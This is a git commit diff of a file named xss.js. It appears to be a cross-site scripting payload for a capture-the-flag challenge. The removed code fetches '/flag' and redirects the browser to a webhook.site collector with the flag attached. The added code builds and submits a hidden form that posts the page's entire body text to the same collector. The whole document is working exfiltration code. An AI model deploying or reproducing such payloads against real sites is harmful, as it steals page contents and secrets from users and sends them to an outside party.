16b0348de089b1c754822237882307d3ac2502c9
abhinav-adobe <akalpathy@adobe.com>
2025-06-25 13:59:06 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,9 @@
-fetch('/flag')
-  .then(r => r.text())
-  .then(flag => {
-    location.href = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c?flag=' + encodeURIComponent(flag);
-  });
+let f = document.createElement('form');
+f.action = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c';
+f.method = 'POST';
+let i = document.createElement('input');
+i.name = 'dump';
+i.value = document.body.innerText;
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
